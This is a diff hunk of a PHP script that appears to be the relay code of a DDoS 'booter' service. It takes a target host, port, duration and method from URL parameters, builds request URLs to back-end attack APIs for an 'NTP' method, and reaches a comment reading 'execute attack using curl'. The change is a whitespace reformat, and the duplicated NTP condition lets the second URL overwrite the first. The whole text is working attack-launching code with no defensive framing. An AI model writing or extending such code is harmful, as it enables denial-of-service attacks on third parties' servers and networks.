@@ -7,13 +7,13 @@ $time = intval($_GET['time']);
 $method = $_GET['method'];
 
 //methods/urls here
-  if($method == "NTP"){
-			       $apiurl = 'https://website.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
-			    }
+if($method == "NTP"){
+$apiurl = 'https://website.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
+}
                
-               if($method == "NTP"){
-			       $apiurl = 'https://website2.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
-			    }
+if($method == "NTP"){
+$apiurl = 'https://website2.com/api.php?host='.$host.'&port='.$port.'&time='.$time.'&method=NTP';
+}
 
 //execute attack using curl
 $ch = curl_init();
